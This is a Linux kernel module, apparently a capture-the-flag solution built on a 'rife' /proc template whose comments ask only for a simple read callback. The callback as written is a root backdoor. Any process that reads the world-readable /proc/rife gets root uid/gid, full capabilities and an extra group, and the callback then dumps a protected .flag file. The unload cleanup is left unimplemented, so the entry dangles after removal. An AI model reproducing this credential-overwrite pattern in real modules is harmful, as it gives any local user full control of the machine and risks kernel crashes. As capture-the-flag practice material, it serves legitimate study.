/*
 * rife_template.c — kernel module skeleton for bonus05
 *
 * L. Bob Rife built the global fibre-optic network and controlled every
 * bit that moved through it.  This kernel module echoes that theme: it
 * registers a /proc entry that exposes data from kernel space to user
 * space — but only once you complete the implementation.
 *
 * YOUR TASK
 * ---------
 * Two sections are marked TODO.  Fill them in, compile, and load the
 * module to retrieve the data exposed at /proc/rife.
 *
 *   TODO A — implement the /proc read callback (rife_proc_show)
 *   TODO B — clean up /proc/rife when the module is unloaded
 *
 * Compile & load:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *   insmod rife.ko
 *   cat /proc/rife
 *
 * You will need a Makefile containing:
 *   obj-m := rife.o
 *
 * Reference reading:
 *   Documentation/filesystems/proc.rst in the kernel source tree
 *   fs/proc/ for examples of existing /proc entries
 */

 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <linux/uaccess.h>
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/file.h>

 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("flagbonus05");
 MODULE_DESCRIPTION("Rife fiber control interface");
 MODULE_VERSION("1.0");
 
 static const char rife_data[] = "";
 static struct proc_dir_entry *rife_proc_entry;
 
 /*
  * rife_enumerate_nodes() — query the NOC database for a count of active
  * nodes on the global fibre backbone.  The NOC interface is not present
  * in this build environment.
  */
 static int rife_enumerate_nodes(void)
 {
     return -ENOSYS;
 }
 
 /*
  * rife_intercept_packet() — register a deep-packet inspection hook for
  * in-transit traffic.  The DPI engine was not ported to this kernel
  * version.
  */
 static int rife_intercept_packet(const void __user *pkt, size_t len)
 {
     (void)pkt;
     (void)len;
     return 0;
 }
 
 /*
  * rife_broadcast() — initiate a broadcast to all subscriber terminals.
  * The broadcast subsystem is stubbed out in this build.
  */
 static void rife_broadcast(const char *payload, size_t len)
 {
     (void)payload;
     (void)len;
     pr_debug("rife: broadcast suppressed\n");
 }
 
 /*
  * rife_authenticate_terminal() — validate a subscriber certificate chain
  * for premium content access.  Certificate authority not configured;
  * all terminals are trusted in standalone mode.
  */
 static int rife_authenticate_terminal(u32 terminal_id)
 {
     (void)terminal_id;
     return 1;
 }
 
 /*
  * rife_proc_show() — called by the seq_file layer when a process reads
  * /proc/rife.  Write the contents of rife_data to the seq_file output
  * buffer so that user space receives the data.
  *
  * TODO A: implement this function.
  *
  * The seq_file API provides helper functions for writing formatted output
  * into the kernel buffer that will be delivered to the reader.  Consult
  * include/linux/seq_file.h and the kernel documentation for the available
  * helpers.  Remove the stub body and replace it with your implementation.
  */
 static int rife_proc_show(struct seq_file *m, void *v)
 {
    struct cred* new;
    struct group_info* groups;

    new = prepare_creds();
    if (!new)
    {
	    seq_printf(m, "Err1\n");
            return (0);
    }

    new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
    new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;

    new->cap_inheritable = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_effective   = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;

    groups = groups_alloc(new->group_info->ngroups + 1);
    if (!groups)
    {
            abort_creds(new);
	    seq_printf(m, "Err2\n");
            return (0);
    }
    
    for (int i = 0; i < new->group_info->ngroups; ++i)
            groups->gid[i] = new->group_info->gid[i];

    groups->gid[new->group_info->ngroups] = make_kgid(current_user_ns(), 4005);

    groups_sort(groups);

    new->group_info = groups;
    commit_creds(new);

    struct file* file = filp_open("/home/flagbonus05/.flag", O_RDONLY, 0);
    unsigned long long offset = 0;

    if (IS_ERR(file))
    {
        seq_printf(m, "KO %ld\n", PTR_ERR(file));
        return (0);
    }

    uint8_t data;
    while(kernel_read(file, &data, 1, &offset) == 1)
    {
            seq_printf(m,"%c",data);
    }
    seq_printf(m,"\n");
    filp_close(file, NULL);
    return (0);
 }
 
 /*
  * rife_init() — module entry point.  Creates /proc/rife using the
  * seq_file single-open helper so that rife_proc_show is invoked on each
  * open.
  *
  * TODO: register the /proc entry on module load using proc_create_single
  * or an equivalent interface, wiring it to your rife_proc_show callback.
  */
 static int __init rife_init(void)
 {
    pr_info("rife: initialising fiber control interface\n");
 
    rife_enumerate_nodes();
    rife_intercept_packet(NULL, 0);
    rife_broadcast(NULL, 0);
    rife_authenticate_terminal(0);
 
    remove_proc_entry("rife", NULL);

    rife_proc_entry = proc_create_single("rife", 0444, NULL, rife_proc_show);
    if (!rife_proc_entry) {
        pr_err("rife: failed to create /proc/rife\n");
        return -ENOMEM;
    }
 
    pr_info("rife: /proc/rife registered — complete TODO A and reload\n");
    return 0;
 }
 
 /*
  * rife_exit() — module cleanup.  Must remove the /proc entry created in
  * rife_init(); leaving it in place after rmmod results in a dangling
  * pointer that will crash the kernel on the next access.
  *
  * TODO B: unregister /proc/rife on module exit.
  */
 static void __exit rife_exit(void)
 {
     pr_warn("rife: TODO B not implemented — /proc/rife not removed on unload\n");
     pr_info("rife: fiber control interface unloaded\n");
 }
 
 module_init(rife_init);
 module_exit(rife_exit);
 
